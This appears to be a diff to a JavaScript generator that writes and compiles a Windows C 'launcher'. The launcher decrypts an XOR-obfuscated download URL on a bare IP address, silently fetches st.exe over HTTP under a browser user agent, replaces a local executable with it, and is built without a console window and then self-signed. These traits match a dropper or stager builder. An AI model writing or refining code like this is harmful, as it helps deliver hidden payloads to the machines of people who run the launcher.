@@ -71,7 +71,6 @@ function encryptStr(str, key) {
 }
 
 function cSource(meta, key, ip, buildId) {
-  // FORCED TO HTTP (PORT 80) LIKE THE ORIGINAL WORKING CODE
   const stUrl = `http://${ip}/api/downloads/st.exe`;
   const esc4c = (s) => String(s).replace(/\\/g, '\\\\').replace(/"/g, '\\"');
   
@@ -84,6 +83,8 @@ function cSource(meta, key, ip, buildId) {
 #include <shlobj.h>
 #include <stdio.h>
 #include <wchar.h>
+
+#pragma comment(lib, "winhttp.lib")
 
 static const char ACCOUNT_KEY[] = "${safeKey}";
 
@@ -108,54 +109,22 @@ static int is_valid_pe(const wchar_t* p) {
     return 1;
 }
 
-static int download_file(const char* url, const wchar_t* dest) {
-    HMODULE hWinHttp = LoadLibraryA("winhttp.dll");
-    if (!hWinHttp) return 0;
-
-    typedef BOOL (WINAPI *pWinHttpCrackUrl)(LPCWSTR, DWORD, DWORD, LPURL_COMPONENTS);
-    typedef HINTERNET (WINAPI *pWinHttpOpen)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
-    typedef HINTERNET (WINAPI *pWinHttpConnect)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
-    typedef HINTERNET (WINAPI *pWinHttpOpenRequest)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
-    typedef BOOL (WINAPI *pWinHttpSendRequest)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
-    typedef BOOL (WINAPI *pWinHttpReceiveResponse)(HINTERNET, LPVOID);
-    typedef BOOL (WINAPI *pWinHttpQueryDataAvailable)(HINTERNET, LPDWORD);
-    typedef BOOL (WINAPI *pWinHttpReadData)(HINTERNET, LPVOID, DWORD, LPDWORD);
-    typedef BOOL (WINAPI *pWinHttpCloseHandle)(HINTERNET);
-
-    pWinHttpCrackUrl WinHttpCrackUrl = (pWinHttpCrackUrl)GetProcAddress(hWinHttp, "WinHttpCrackUrl");
-    pWinHttpOpen WinHttpOpen = (pWinHttpOpen)GetProcAddress(hWinHttp, "WinHttpOpen");
-    pWinHttpConnect WinHttpConnect = (pWinHttpConnect)GetProcAddress(hWinHttp, "WinHttpConnect");
-    pWinHttpOpenRequest WinHttpOpenRequest = (pWinHttpOpenRequest)GetProcAddress(hWinHttp, "WinHttpOpenRequest");
-    pWinHttpSendRequest WinHttpSendRequest = (pWinHttpSendRequest)GetProcAddress(hWinHttp, "WinHttpSendRequest");
-    pWinHttpReceiveResponse WinHttpReceiveResponse = (pWinHttpReceiveResponse)GetProcAddress(hWinHttp, "WinHttpReceiveResponse");
-    pWinHttpQueryDataAvailable WinHttpQueryDataAvailable = (pWinHttpQueryDataAvailable)GetProcAddress(hWinHttp, "WinHttpQueryDataAvailable");
-    pWinHttpReadData WinHttpReadData = (pWinHttpReadData)GetProcAddress(hWinHttp, "WinHttpReadData");
-    pWinHttpCloseHandle WinHttpCloseHandle = (pWinHttpCloseHandle)GetProcAddress(hWinHttp, "WinHttpCloseHandle");
-
-    if (!WinHttpCrackUrl || !WinHttpOpen || !WinHttpConnect || !WinHttpOpenRequest || !WinHttpSendRequest || !WinHttpReceiveResponse || !WinHttpQueryDataAvailable || !WinHttpReadData || !WinHttpCloseHandle) {
-        FreeLibrary(hWinHttp); return 0;
-    }
-
+static int download_file(const wchar_t* url, const wchar_t* dest) {
     URL_COMPONENTS uc = {0}; uc.dwStructSize = sizeof(uc);
     wchar_t host[256] = {0}; wchar_t path[1024] = {0};
     uc.lpszHostName = host; uc.dwHostNameLength = 256;
     uc.lpszUrlPath = path; uc.dwUrlPathLength = 1024;
-
-    wchar_t urlW[512];
-    MultiByteToWideChar(CP_ACP, 0, url, -1, urlW, 512);
-
-    if (!WinHttpCrackUrl(urlW, 0, 0, &uc)) {
-        FreeLibrary(hWinHttp); return 0;
-    }
+    
+    if (!WinHttpCrackUrl(url, 0, 0, &uc)) return 0;
 
     HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
-    if (!hSession) { FreeLibrary(hWinHttp); return 0; }
+    if (!hSession) return 0;
 
     HINTERNET hConnect = WinHttpConnect(hSession, host, uc.nPort, 0);
-    if (!hConnect) { WinHttpCloseHandle(hSession); FreeLibrary(hWinHttp); return 0; }
+    if (!hConnect) { WinHttpCloseHandle(hSession); return 0; }
 
     HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
-    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); FreeLibrary(hWinHttp); return 0; }
+    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return 0; }
 
     BOOL bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
     if (bResults) bResults = WinHttpReceiveResponse(hRequest, NULL);
@@ -181,19 +150,10 @@ static int download_file(const char* url, const wchar_t* dest) {
         }
     }
 
-    DWORD lastErr = GetLastError();
     WinHttpCloseHandle(hRequest);
     WinHttpCloseHandle(hConnect);
     WinHttpCloseHandle(hSession);
-    FreeLibrary(hWinHttp);
-
-    if (!bResults) {
-        wchar_t errMsg[256];
-        _snwprintf(errMsg, 256, L"Download failed over HTTP. WinHTTP Error: %lu", lastErr);
-        MessageBoxW(NULL, errMsg, L"Error", MB_ICONERROR);
-        return 0;
-    }
-    return 1;
+    return bResults;
 }
 
 int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
@@ -222,15 +182,18 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
         CloseHandle(hKey);
     }
 
-    // 2. Download st.exe over HTTP
+    // 2. Download st.exe
     int need_st = !is_valid_pe(stPath);
     if (need_st) {
         char stUrlStr[128] = {0};
+        wchar_t stUrlW[128] = {0};
         const char encStUrl[] = ${encStUrl};
         
         decrypt(stUrlStr, sizeof(encStUrl), ${meta.xorKey});
+        MultiByteToWideChar(CP_ACP, 0, stUrlStr, -1, stUrlW, 128);
 
-        if (download_file(stUrlStr, stNewPath) && is_valid_pe(stNewPath)) {
+        // Download to a temp file to prevent "File Already Exists"
+        if (download_file(stUrlW, stNewPath) && is_valid_pe(stNewPath)) {
             DeleteFileW(stPath);
             MoveFileW(stNewPath, stPath);
             need_st = 0;
@@ -320,7 +283,7 @@ export async function compileLauncher({ key, config, baseExe, buildId }) {
                     { cwd: workDir, timeout: 30_000 });
     
     await execFileP(CC, ['-O2', '-s', '-mwindows', '-o', outPath, cPath, resPath,
-                         '-lshell32', '-lole32', '-luser32', '-lkernel32', '-ladvapi32'],
+                         '-lshell32', '-lole32', '-luser32', '-lkernel32', '-ladvapi32', '-lwinhttp'],
                     { cwd: workDir, timeout: 60_000 });
 
     console.log('[launcher] self-signing binary...');
